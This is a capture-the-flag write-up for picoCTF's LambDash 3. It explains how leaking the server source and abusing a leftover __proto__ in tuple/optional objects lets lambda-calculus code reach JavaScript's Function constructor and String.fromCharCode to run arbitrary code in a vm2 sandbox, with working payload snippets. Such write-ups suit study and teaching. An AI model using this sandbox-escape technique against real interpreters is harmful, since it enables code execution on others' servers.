# LambDash 3
In this challenge we were given a site with an introduction to a variant of the Lambda Calculus language called SystemF, along with an online web shell. 

### Getting the source
First thing I did was sending an extremely large payload to the interpreter (endpoint: `/run`) to see what would happen. It returned a stack trace containing the path to the challenge files. I logged in to the picoCTF shell, zipped the whole directory, and downloaded it with scp. 

### Initial setup
We can see that this app is written in TypeScript and is running on NodeJS. I set it up locally to make exploiting and debugging easier. To do this, navigate to the directory named "problem" in source and run the following command:
```sh
tsc --build tsconfig.json && node --inspect ./dist/server.js
```

The app will be compiled and run on local port 4001. You can also debug it like any other Node app using Chromium DevTools by visiting `chrome-devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/<uuid>`, where <uuid> is the UUID given to you when you run the app. 

### Analysis
Okay, now we're in possession of the app's source code and the app is running locally. Let us analyze what is this app doing. If you access `/problem/src/server.ts`, you can see the source of the `/run` endpoint:
```javascript
	app.post("/run", (req, res) => {
		let code = req.body.code;
		let ast: E; 
		try {
			ast = parse(code);
		} catch (e) {
			res.send(`Error -- code did not parse<br>${e.toString()}`);
			return;
		}
		let type: Type;
		try {
			type = typecheck(ast);
		} catch (e) {
			res.send(`Error -- code did not typecheck<br>${e.toString()}`);
			return;
		}
		let vm = new vm2.NodeVM({
			timeout: 1000,
			sandbox: {
				ast,
				hidden: {
					getFlag: ((f: string) => ((x: string) => {
						if (x === "if you can get this you deserve the flag -> abcd1234!@#$%^&*()'") {
							return f;
						}
						return "Bad! " + x;
					}))(process.env.FLAG)
				},
			},
			require: {
				context: "sandbox",
				external: ["./emulator", "immutable"],
				root: __dirname,
			},
		});
		try {
			let result = vm.run(new vm2.VMScript(`
				let emulator = require("${__dirname}/emulator");
				module.exports = emulator.resToString(emulator.default(ast));
			`));
			console.log(result);
			res.send(`Result:<br>${result}:${typeToString(type)}`);
		} catch (e) {
			console.log("Wut", e.stack);
			res.send(`Error -- failed to execute<br>${e}`);
		}

	})
```
It does a few things:
* It parses the received code to get AST (abstract syntax tree)
* It checks if all types in the program are okay
* It runs the program in a Node sandbox of some kind, while also passing an object containing the function that we're interested in:
```javascript
hidden: {
	getFlag: ((f: string) => ((x: string) => {
		if (x === "if you can get this you deserve the flag -> abcd1234!@#$%^&*()'") {
			return f;
		}
		return "Bad! " + x;
	}))(process.env.FLAG)
},
```
* It prints the result of the program to the user

As such, our objective is clear: it's to submit a piece of code to /run that would run `hidden.getFlag("if you can get this you deserve the flag -> abcd1234!@#$%^&*()'")` and return the result. Easy enough, isn't it? Well, I found it everything _but_ easy, as my knowledge of both JS and functional programming is pretty much non-existent. At this point I started learning from the provided tutorial, submitting different programs, analyzing them, analyzing the code of the interpreter (located in `/problem/src/emulator.ts`), and so on. It took me about 10 hours.

### Exploitation
LC = Lambda Calculus SystemF, the language used in this task

*While writing this solution, it occurred to me that my original solution was a bit needlessly complicated and contained some redundancy. This solution is slightly more reasonable. You can find the original payload that I used to solve this task in payload_old.txt.*

There is only one bug that we need to find in order to solve this task, and everything else is its consequence.
LC has tuples and optional types, both of which are implemented as JS objects. Therefore, if you have tuple consisting of int f and int g, it will internally exist as a JS object, such as:
```javascript
{
    f: 5
    g: 10
}
```
Optional type is very similar, except there is just one variable in it. When the interpreter wants to do something with an optional type, it iterates over the possible parameter names and checks if a parameter is present in the object (`object[name] != undefined`).
Objects to be used as tuples/optionals are created using this function (you can find it in `/problem/src/emulator.ts`):
```javascript
function getCleanObject(): { [key: string]: any } {
	let obj = {};
	for (let prop of Object.getOwnPropertyNames((obj as any).__proto__)) {
		(obj as any)[prop] = undefined;
	}
	(obj as any).__proto__ = undefined;
	return obj;
}
```
_Now comes the part that I still cannot fully comprehend, some help from a NodeJS expert would be greatly appreciated._

The most important part of the solution is to figure out that this function doesn't really work. I'm not sure why, but it probably has to do with Node internals. If you create an object using `a = getCleanObject()`, it will **still have** the `__proto__` attribute, instead of having it undefined, which means you can reference `a['__proto__']`. 
Knowing that in any optional the `__proto__` attribute is always set, we can define an optional with 
```< `__proto__ { `constructor { `constructor int }} + `val int>```, 
and proceed to create a new instance of it with `val` set to a number. While processing this optional, we can tell the interpreter to look for the `__proto__` attribute first. It will of course find it, thinking that it is a tuple containing an attribute called `constructor`, which in turn is another tuple containing an attribute called `constructor`. So, by extracting it, we do something like:
```javascript
a = {}
a['__proto__']['constructor']['constructor']
```
Which gives us the JavaScript function constructor. How to do it in LC? Here's the code:
```
(alias opta = < `__proto__ { `constructor { `constructor int -> (int -> int)}} + `val int -> (int -> int)> in
(lambda argb:opta.
    case(argb) {
        `__proto__ rr -> rr#`constructor#`constructor
        | `val rr -> rr}
)(`val (lambda xx:int.lambda xxx:int.xx) as opta))
```
I changed the parameter types from int to int -> (int -> int), because we need to call this constructor, and then call the function that it returns. So now we've fooled the interpreter into thinking that the JavaScript function constructor is a lambda expression taking an int and returning another lambda expression, which in turn takes an int and returns an int. Complicated, but now we're just one step away from victory, and the question is: how to pass a string to that function?

Well, LC doesn't have strings, so we have to implement them ourselves, which was easy compared to the rest of the task.
We can use the exact same trick as before, but this time let's retrieve the String.fromCharCode method instead.
In JS that would be:
```javascript
a['__proto__']['constructor']['name']['constructor']['fromCharCode']
```
As translated to LC:
```
(alias opta = < `__proto__ { `constructor { `name { `constructor { `fromCharCode int -> int}}}} + `val int -> int> in
(lambda argb:opta.
    case(argb) {
        `__proto__ r -> r#`constructor#`name#`constructor#`fromCharCode 
        | `val r -> r
    }
)(`val (lambda x:int.x) as opta))
```
We can then call this lambda by passing an int to it, and we receive the corresponding char (which the interpreter thinks is an int).
All that's left is to concatenate those chars using a different lambda, pass the string to the function constructor, and call the result. 
Example demonstrating the construction of a two char long string:
```
(lambda a : int.
lambda b : int.
    a + b)
((alias opta = < `__proto__ { `constructor { `name { `constructor { `fromCharCode int -> int}}}} + `val int -> int> in
(lambda argb:opta.
    case(argb) {
        `__proto__ r -> r#`constructor#`name#`constructor#`fromCharCode 
        | `val r -> r
    }
)(`val (lambda x:int.x) as opta)) 65)
((alias opta = < `__proto__ { `constructor { `name { `constructor { `fromCharCode int -> int}}}} + `val int -> int> in
(lambda argb:opta.
    case(argb) {
        `__proto__ r -> r#`constructor#`name#`constructor#`fromCharCode 
        | `val r -> r
    }
)(`val (lambda x:int.x) as opta)) 66)
```
After preparing the full payload and pasting it to the site, we got the flag, which I unfortunately didn't save anywhere :D
The full payload is available in payload.txt.
